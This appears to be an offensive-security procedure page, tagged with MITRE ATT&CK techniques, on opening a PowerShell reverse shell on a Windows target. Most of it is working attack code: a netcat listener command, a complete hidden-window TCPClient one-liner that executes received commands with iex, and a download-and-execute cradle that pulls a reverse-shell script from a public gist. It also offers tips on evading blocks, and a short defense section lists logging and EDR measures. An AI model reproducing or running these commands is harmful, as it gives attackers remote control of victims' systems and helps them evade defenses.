---
type: procedure
description: >-
  Establishes a reverse shell connection from a target Windows system back to an
  attacker-controlled machine using PowerShell scripting.
verified: true
submitted: false
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
techniques:
  - '[[techniques/Remote Access Tools|T1219 - Remote Access Tools]]'
  - '[[techniques/Command and Scripting Interpreter|T1059.001 - PowerShell]]'
sub_techniques: []
tags:
  - '[[tags/PowerShell]]'
  - '[[tags/Reverse Shell]]'
commands:
  - '[[commands/PowerShell-One-Liner-Reverse-Shell]]'
  - '[[commands/PowerShell-Download-Mini-Reverse-Shell]]'
platforms:
  - Windows
tools: []
validated: true
---

# Establish-PowerShell-Reverse-Shell

## Summary

This procedure outlines how to establish a reverse shell on a Windows target using PowerShell to create a TCP connection back to an attacker machine, enabling remote command execution. It includes methods for direct one-liner execution and downloading a script from a remote location, assuming initial access to run PowerShell commands on the target.

## Description

A PowerShell reverse shell leverages the .NET System.Net.Sockets.TCPClient class to connect from the target to a listener on the attacker's machine, typically using netcat or similar. Once connected, it reads commands from the stream, executes them via Invoke-Expression (iex), and sends output back. This technique is useful in post-exploitation scenarios where PowerShell is available (default on Windows 7+), providing interactive access without additional binaries. It bypasses some AV through obfuscation flags like -NoP, -NonI, -W Hidden, and -Exec Bypass. The target environment is Windows with PowerShell 2.0+, and network outbound access to the attacker's IP/port. Success allows persistent command execution as the current user.

## Requirements

1. Initial access to the target system (e.g., via phishing, RCE, or valid accounts) to execute PowerShell commands.
2. PowerShell installed on the target (standard on Windows Vista+).
3. Network connectivity from target to attacker's IP/port (e.g., TCP 4444 outbound allowed).
4. Attacker-side listener ready (e.g., nc -lvnp 4444).

## Defense

- Enable PowerShell logging (Module, ScriptBlock, Transcription) to capture executed code.
- Implement application whitelisting (e.g., AppLocker) to restrict PowerShell execution.
- Monitor network traffic for unusual outbound TCP connections from Windows hosts to high ports.
- Use EDR tools to detect anomalous PowerShell processes spawning network activity or iex usage.

## Objectives

1. Establish a TCP reverse connection from target to attacker.
2. Enable interactive command execution on the target.
3. Maintain access for further post-exploitation without dropping binaries.

## Instructions

### Step 1: Set Up Attacker Listener

**Context**: Before executing on the target, start a listener on your machine to receive the incoming connection. This step ensures the reverse shell has a endpoint to connect to.

Use a tool like netcat:

```bash
nc -lvnp $ATTACKER_PORT
```

> Expected: Listener binds to the specified port and awaits connections. Replace $ATTACKER_PORT with your chosen port (e.g., 4444).

### Step 2: Execute Direct One-Liner Reverse Shell

**Context**: With initial access, run a PowerShell one-liner to instantiate the TCP client and handle the shell loop. This method embeds the entire script in the command for immediate execution.

**Command** ([[commands/PowerShell-One-Liner-Reverse-Shell]]):

Embed the core script from [[codes/PowerShell-TCP-Reverse-Shell]] into the invocation.

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient('$ATTACKER_IP',$ATTACKER_PORT); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()
```

> This creates a TCP client connecting to the attacker's IP/port, sets up a stream for bidirectional communication, and loops to execute received commands via iex while sending PS1-style prompts and output back. If the connection succeeds, your listener receives a shell prompt. Verify by sending commands like 'whoami' and receiving output. If blocked, try alternative invocations or obfuscation.

### Step 3: Alternative - Download and Execute Mini Reverse Shell

**Context**: If direct execution is restricted, download and invoke a pre-hosted script. This uses WebClient to fetch and execute a mini reverse shell script, reducing the payload size on initial access.

**Command** ([[commands/PowerShell-Download-Mini-Reverse-Shell]]):

```powershell
powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
```

> This downloads the script from the specified URL and executes it via Invoke-Expression. The script (mini-reverse.ps1) contains a compact reverse shell implementation similar to the core code. Expected: Connection to your listener if the script runs successfully. Host the script yourself for customization, ensuring the URL is accessible from the target. If download fails, check firewall/proxy settings or use alternative hosts like Pastebin.
